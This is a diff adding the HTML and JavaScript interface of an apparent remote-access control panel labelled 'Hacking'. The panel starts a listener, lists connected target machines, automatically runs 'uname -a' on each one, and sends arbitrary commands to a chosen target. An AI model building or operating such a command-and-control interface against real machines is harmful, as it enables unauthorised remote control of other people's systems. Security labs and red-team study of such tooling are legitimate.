@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server Interface</title>
+        
+    <head>
+        <link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/omerimzali/uiterminal@master/uiterminal.min.css" >
+   </head>
+    <!-- Adicionando o link para o arquivo CSS externo -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='assets/css/styles.css')}}">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 20px;
+            position: relative;
+        }
+        .client-item .bullet {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+
+        .client-item.online .bullet {
+            background-color: green;
+        }
+
+        .dashboard {
+            background-color: #333;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .dashboard ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+        }
+        .dashboard li {
+            margin-right: 10px;
+        }
+        .dashboard li a {
+            color: #fff;
+            text-decoration: none;
+            padding: 10px;
+            border-radius: 5px;
+            background-color: #555;
+            transition: background-color 0.3s ease;
+        }
+        .dashboard li a:hover {
+            background-color: #777;
+        }
+        .content {
+            margin-top: 20px;
+        }
+        h1, h2 {
+            color: #333;
+        }
+        form {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            margin-bottom: 5px;
+        }
+        .client-item {
+            display: flex;
+            align-items: center;
+        }
+        .client-item .bullet {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .client-item.online .bullet {
+            background-color: green;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<header class="header">
+    <a href="#" class="header__logo">MikNous</a>
+    <ion-icon name="menu-outline" class="header__toggle" id="nav-toggle"></ion-icon>
+    <nav class="nav" id="nav-menu">
+        <div class="nav__content bd-grid">
+            <ion-icon name="close-outline" class="nav__close" id="nav-close"></ion-icon>
+            <div class="nav__perfil">
+                <div class="nav__img">
+                    <img src="https://raw.githubusercontent.com/hannob/vulns/master/logo/robot.svg" alt="">
+                </div>
+                <div>
+                    <a href="#" class="nav__name">MikNous</a>
+                    <span class="nav__profesion">Hacking</span>
+                </div>
+            </div>
+            <div class="nav__menu">
+                <ul class="nav__list">
+                    <li class="nav__item"><a href="#startServer" class="nav__link active">Server</a></li>
+                    <li class="nav__item"><a href="#activeConnections" class="nav__link">Connections</a></li>
+                    <li class="nav__item"><a href="#sendCommand" class="nav__link">Command</a></li>
+                </ul>
+            </div>
+            <div class="nav__social">
+                <a href="#" class="nav__social-icon"><ion-icon name="logo-linkedin"></ion-icon></a>
+                <a href="#" class="nav__social-icon"><ion-icon name="logo-github"></ion-icon></a>
+                <a href="#" class="nav__social-icon"><ion-icon name="logo-behance"></ion-icon></a>
+            </div>
+        </div>
+    </nav>
+</header>
+<div class="content container">
+<br>
+<br>
+    <h1>Server Interface</h1>
+    <section id="startServer" class="section hidden">
+        <h2>Start Server</h2>
+        <form id="startServerForm">
+            <label for="host">Host:</label>
+            <input type="text" id="host" name="host" required>
+            <label for="port">Port:</label>
+            <input type="number" id="port" name="port" required>
+            <button type="submit">Start Server</button>
+            <h2>Server Logs</h2>
+              <span class='uiterminal-line is-empty'>
+<ul id="logList">
+        </ul>
+ </span>
+        </form>
+    </section>
+<br>
+<br>
+    <section id="activeConnections" class="section">
+        <h2>Active Connections</h2>
+        <ul id="connectionList">
+        </ul>
+       
+ </span>
+        
+    </section>
+<br><br>
+    <section id="sendCommand" class="section hidden">
+        <h2>Send Command</h2>
+        <form id="sendMessageAndWaitForm">
+            <label for="targetId">Target ID:</label>
+            <select id="targetId" name="targetId" required>
+            </select>
+            <label for="message">Message:</label>
+            <input type="text" id="message" name="message" required>
+            <button type="submit">Send Message</button>
+        </form>
+<span class='uiterminal-line is-empty'>
+    <ul id="responseList"></ul>
+</span>
+
+    </section>
+</div>
+
+<script>
+    document.querySelectorAll('.nav__link').forEach(link => {
+        link.addEventListener('click', function(event) {
+            event.preventDefault();
+            let target = this.getAttribute('href').substring(1);
+            document.querySelectorAll('.section').forEach(section => {
+                if (section.id === target) {
+                    section.classList.remove('hidden');
+                } else {
+                    section.classList.add('hidden');
+                }
+            });
+        });
+    });
+
+    document.getElementById('startServerForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+        let formData = new FormData(this);
+        fetch('/start_server', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log(data);
+        });
+    });
+
+    function listConnections() {
+        fetch('/list_connections')
+        .then(response => response.json())
+        .then(data => {
+            let connectionList = document.getElementById('connectionList');
+            connectionList.innerHTML = '';
+            data.forEach(connection => {
+                let listItem = document.createElement('li');
+                listItem.classList.add('client-item');
+                if (connection.online) {
+                    listItem.classList.add('online');
+                }
+                listItem.innerHTML = `<span class="bullet"></span>ID: ${connection.id}, Address: ${connection.address}`;
+                connectionList.appendChild(listItem);
+
+                // Enviar comando 'uname -a' e adicionar ao lado do cliente na lista
+                fetch('/send_command', {
+                    method: 'POST',
+                    body: JSON.stringify({ command: 'uname -a', targetId: connection.id }),
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        const unameInfo = document.createElement('span');
+                        unameInfo.textContent = ` | ${data.output}`;
+                        listItem.appendChild(unameInfo);
+                    } else {
+                        console.error('Error:', data.message);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        });
+    }
+
+    function getLogs() {
+        fetch('/get_logs')
+        .then(response => response.json())
+        .then(data => {
+            let logList = document.getElementById('logList');
+            logList.innerHTML = '';
+            data.forEach(log => {
+                let listItem = document.createElement('li');
+                listItem.textContent = log;
+                logList.appendChild(listItem);
+            });
+        });
+    }
+
+    function populateClientOptions() {
+        fetch('/list_connections')
+        .then(response => response.json())
+        .then(data => {
+            let select = document.getElementById('targetId');
+            select.innerHTML = '';
+            data.forEach(connection => {
+                let option = document.createElement('option');
+                option.value = connection.id;
+                option.textContent = connection.id;
+                select.appendChild(option);
+            });
+        });
+    }
+
+    function sendMessageAndWait(event) {
+        event.preventDefault();
+        let formData = new FormData(document.getElementById('sendMessageAndWaitForm'));
+        fetch('/send_message_and_wait', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                let responseList = document.getElementById('responseList');
+                responseList.innerHTML = ''; // Limpa qualquer conteúdo anterior
+                data.message.split('\n').forEach(line => { // Divide a resposta em linhas
+                    let listItem = document.createElement('li');
+                    listItem.textContent = line.trim(); // Remove espaços em branco desnecessários
+                    responseList.appendChild(listItem);
+                });
+            } else {
+                console.error('Error:', data.message);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+
+    document.getElementById('sendMessageAndWaitForm').addEventListener('submit', sendMessageAndWait);
+
+    listConnections();
+    getLogs();
+    populateClientOptions();
+    setInterval(listConnections, 5000);
+    setInterval(getLogs, 5000);
+</script>
+<script src="https://unpkg.com/ionicons@5.1.2/dist/ionicons.js"></script>
+<script src="{{ url_for('static', filename='assets/js/main.js')}}"></script>
+</body>
+  </html>
+                
